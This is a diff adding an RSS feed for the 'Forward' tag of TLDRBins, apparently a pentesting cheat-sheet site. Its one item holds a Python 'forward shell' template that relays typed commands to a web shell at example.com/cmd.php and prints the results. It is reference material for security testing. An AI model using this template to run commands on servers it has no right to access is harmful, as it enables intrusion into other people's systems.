@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Forward on TLDRBins</title>
+    <link>https://tldrbins.github.io/@forward/</link>
+    <description>Recent content in Forward on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@forward/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Forward Shell</title>
+      <link>https://tldrbins.github.io/forward_shell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/forward_shell/</guid>
+      <description> Python Forward Shell Template #!/usr/bin/env python3 from cmd import Cmd import requests class Term(Cmd): prompt = &amp;#34;shell&amp;gt; &amp;#34; def default(self, args): response = requests.get(&amp;#34;http://example.com/cmd.php&amp;#34;, params = {&amp;#34;cmd&amp;#34;: args}, proxies={&amp;#34;http&amp;#34;:&amp;#34;http://127.0.0.1:8080&amp;#34;}) print(response.text) term = Term() term.cmdloop() </description>
+    </item>
+  </channel>
+</rss>
